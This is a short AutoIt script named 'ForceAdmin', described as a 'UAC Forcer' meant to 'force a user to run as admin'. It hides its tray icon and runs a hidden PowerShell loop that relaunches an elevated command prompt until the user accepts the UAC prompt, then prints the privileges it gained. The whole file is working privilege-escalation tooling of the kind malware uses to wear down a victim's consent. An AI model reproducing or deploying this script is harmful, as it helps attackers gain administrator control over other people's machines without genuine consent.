#cs ----------------------------------------------------------------------------
 https://github.com/Chainski/ForceAdmin
 AutoIt Version: 3.3.16.1
 Author : Chainski
 Script Function:
	Autoit UAC Forcer
	[*] Force a user to run as admin
#ce ----------------------------------------------------------------------------
#NoTrayIcon
RunWait(@ComSpec & " /c powershell while($true){try{Start-Process 'cmd' -Verb runas -ArgumentList '/k whoami /priv';exit}catch{}}", @SystemDir, @SW_HIDE)
